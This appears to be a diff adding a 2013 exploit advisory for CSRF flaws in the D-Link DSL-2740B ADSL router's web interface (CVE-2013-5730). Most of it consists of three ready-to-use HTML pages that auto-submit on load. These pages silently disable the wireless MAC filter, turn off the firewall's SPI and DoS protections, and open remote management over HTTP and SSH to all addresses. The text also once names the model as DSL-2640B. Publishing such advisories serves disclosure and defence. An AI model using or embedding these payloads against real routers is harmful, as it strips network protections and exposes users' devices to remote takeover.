@@ -1,0 +1,65 @@
++--------------------------------------------------------------------------------------------------------------------------------+
+# Exploit Title    : D-Link DSL-2740B (ADSL Router) CSRF Vulnerability
+# Date             : 09-08-2013
+# Author           : Ivano Binetti (http://ivanobinetti.com)
+# Vendor site      : http://www.d-link.com
+# Version          : DSL-2740B 
+# Tested on        : Firmware Version: EU_1.00 (Other release could be affected)
+# Original Advisory: http://www.webapp-security.com/2013/09/d-link-dsl-2740b-multiple-csrf-vulnerabilities
+# CVE              : CVE-2013-5730
++---------------------------------------------------------------------------------------------------------------------------------+
+Summary
+
+1)Introduction
+2)Vulnerability Description
+3)Exploit
+ 3.1 Disable/Enable Wireless MAc Address Filter
+ 3.2 Disable/Enable all the Firewall protections (Both "SPI" and "DOS and Portscan Protection")
+ 3.3 Enable/Disable Remote Management (in my exploit I enabled remote management via http - tcp port 80 - and ssh - tcp port 22 -)
++---------------------------------------------------------------------------------------------------------------------------------+
+
+
+1) Introduction
+
+D-Link DSL-2740B is an ADSL Router using, also,  a web management interface in order to set and change device parameters.
+
+
+2) Vulnerability Description
+
+The D-Link DSL-2640B's web interface (listening on tcp/ip port 80) is prone to CSRF vulnerabilities which allows to change router 
+parameters and to perform many modifications to the router's parameters. The default ip adress of this adsl router, used for
+management purpose, is 192.168.1.1.
+In my Advisory I'll describe only how to carry out the following changes:
+- Disable/Enable Wireless MAc Address Filter
+- Disable/Enable all the Firewall protections (Both "SPI" and "DOS and Portscan Protection")
+- Enable/Disable Remote Management (in my exploit I enabled remote management via http - tcp port 80 - and ssh - tcp port 22 -).
+Many other changes can be performed.
+
+3) Exploit 
+ 3.1 Disable/Enable Wireless MAc Address Filter
+ <html>
+ <body onload="javascript:document.forms[0].submit()">
+ <H2>CSRF Exploit</H2>
+ <form method="POST" name="form0" action="http://192.168.1.1:80/wlmacflt.cmd?action=wlFltMode&wlFltMacMode=disabled">
+ </body>
+ </html>
+
+ 3.2 Disable/Enable all the Firewall protections (Both "SPI" and "DOS and Portscan Protection")
+ <html>
+ <body onload="javascript:document.forms[0].submit()">
+ <H2></H2>
+ <form method="POST" name="form0" action="http://192.168.1.1:80/scdmz.cmd?&fwFlag=521472&dosenbl=0">
+ </body>
+ </html>
+
+ 3.3 Enable/Disable Remote Management (in my exploit I enabled remote management via http - tcp port 80 - and ssh - tcp port 22 -)
+ <html>
+ <body onload="javascript:document.forms[0].submit()">
+ <H2></H2>
+ <form method="POST" name="form0" action="http://192.168.1.1:80/scsrvcntr.cmd?action=save&rmtmode=1&rmtport=80&rmtaction=allowall&
+ ftp=0&http=2&icmp=2&snmp=2&tftp=0&ssh=1&telnet=0">
+ </body>
+ </html>
++----------------------------------------------------------------------------------------------------------------------------------+
+
+
